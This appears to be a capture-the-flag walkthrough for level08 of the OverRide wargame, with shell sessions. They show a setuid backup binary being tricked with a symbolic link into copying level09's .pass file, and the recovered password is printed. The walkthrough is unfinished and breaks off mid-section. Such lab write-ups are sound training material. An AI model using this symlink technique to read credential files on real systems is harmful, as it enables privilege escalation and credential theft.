# Level08 Walkthrough

## Analyzing the Program with GDB and ghidra
NEED TO GHIDRA 

1. **Whats happening**: 

- This a binary that takes a file in args, and a specific one. Its primary funtion involves generatin a backup of the file within the directory `/backups` and simultaneously logging relevant information to the file named `backups/.log`.

```bash
level08@OverRide:~$ ls
backups  level08

level08@OverRide:~$ ls -la backups/
total 4
drwxrwx---+ 1 level09 users    60 Oct 19  2016 .
dr-xr-x---+ 1 level08 level08 100 Oct 19  2016 ..
-rwxrwx---+ 1 level09 users    49 Dec 15 21:26 .log
level08@OverRide:~$ cat backups/.log
LOG: Starting back up: /home/users/level09/.pass

```

- Lets try something :
```bash
level08@OverRide:~$ chmod 777 .
level08@OverRide:~$ mkdir -p test
level08@OverRide:~$ ls
backups  level08  test
level08@OverRide:~$ ./level08 test
level08@OverRide:~$ cat backups/.log 
LOG: Starting back up: test
LOG: Finished back up test
```

- Lets try with a file : 
```bash
level08@OverRide:~$ cat > pass
password
level08@OverRide:~$ ./level08 pass
level08@OverRide:~$ cat backups/.log
LOG: Starting back up: pass
LOG: Finished back up pass
level08@OverRide:~$ cat backups/pass
password
```

- We can see that the directory and the file are set with the setuid `level09` users : 
```bash

drwxrwx---+ 1 level09 users   100 Dec 15 21:31 .
drwxrwxrwx+ 1 level08 level08 140 Dec 15 21:31 ..
-rwxrwx---+ 1 level09 users    40 Dec 15 21:32 .log
-r--r-----+ 1 level09 users     9 Dec 15 21:31 pass
-r--r-----+ 1 level09 users     0 Dec 15 21:30 test
```

- So lets use a a symbolic link to bypass the backups : 
```bash
level08@OverRide:~$ ln -s /home/users/level09/.pass passwd
level08@OverRide:~$ ls
backups  level08  pass  passwd  test

level08@OverRide:~$ ./level08 passwd
level08@OverRide:~$ cat backups/passwd 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

```
---


## Moving to level09

1. **Swith User to level09**:
    Run ```su level09```
```

2. **Authenticate with the Password**:
    
   
 